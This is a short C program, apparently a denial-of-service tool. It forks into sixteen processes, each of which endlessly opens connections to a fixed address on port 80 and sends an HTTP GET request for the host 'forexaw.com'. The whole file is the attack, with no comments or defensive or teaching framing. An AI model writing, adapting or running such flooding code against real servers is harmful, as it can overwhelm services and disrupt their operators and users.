#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

char message[] = "GET / HTTP/1.1\r\nHost: forexaw.com\r\nUser-Agent: 123\r\n\r\n";

char buf[1024];

int main()
{
  int sock;
  struct sockaddr_in addr;
  addr.sin_family = AF_INET;
  addr.sin_port = htons(80);
  // addr.sin_addr.s_addr = inet_aton("10.0.4.110");
  inet_aton("10.0.4.110", &addr.sin_addr.s_addr);
  int c = 0;
  int i = 4;
  while (i > 0) {
    fork();
    i--;
  }

  while (1) {

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0)
    {
    perror("socket");
    exit(1);
    }

    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0)
    {
      perror("connect");
      exit(1);
    }

    send(sock, message, sizeof(message), 0);
    //c++;
    //printf("Start %d\n",c);
    //printf(message);
    //recv(sock, buf, 1024, 0);

    //printf(buf);
    close(sock);
  }
  return 0;
}
